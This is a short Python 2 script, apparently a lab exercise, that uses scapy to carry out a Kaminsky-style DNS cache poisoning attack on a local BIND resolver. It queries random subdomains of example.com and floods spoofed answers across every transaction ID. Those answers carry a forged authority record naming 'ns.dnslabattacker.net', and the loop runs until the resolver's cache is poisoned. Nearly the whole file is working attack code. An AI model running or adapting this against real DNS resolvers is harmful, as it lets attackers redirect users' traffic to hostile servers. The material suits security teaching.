#!/usr/bin/env python2
import argparse
import socket

from scapy.all import *
from random import randint, choice, shuffle
from string import ascii_lowercase, digits
from subprocess import call

parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=False)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
    sendPacket(sock, dnsPacket, my_ip, my_port)
    response = sock.recv(4096)
    response = DNS(response)
    print "\n***** Packet Received from Remote Server *****"
    print response.show()
    print "***** End of Remote Server Packet *****\n"

'''
Query over the socket for the IPv4 address of a domain
'''
def queryDNS(socket, domain):
    packet = DNS(rd=1, qd=DNSQR(qname=domain))
    sendPacket(socket, packet, my_ip, my_port)
    response = socket.recv(4096)
    return packet, DNS(response)

if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)

    attack_query, attack_response = queryDNS(sock, 'example.com')

    for i in range(attack_response[DNS].nscount):
        attack_response[DNS].ns[DNSRR][i].rdata = "ns.dnslabattacker.net" 

    attack_response[DNS].arcount = 0
    attack_response[DNS].aa = 1
    attack_response[DNS].nscount = 1

    ids = range(0,256,1)

    while (True):
        subdomain = getRandomSubDomain() + '.' + "example.com"

        attack_query.qd.qname = subdomain
        attack_response.qd.qname = subdomain
        attack_response.an.rrname = subdomain
        
        shuffle(ids)

        sendPacket(sock, attack_query, my_ip, my_port)

        for n in ids:
            attack_response.id = n
            sendPacket(sock, attack_response, my_ip, my_query_port)

        _, validate_response = queryDNS(sock, 'example.com')

        if (validate_response.ns.rdata == "ns.dnslabattacker.net."):
            break
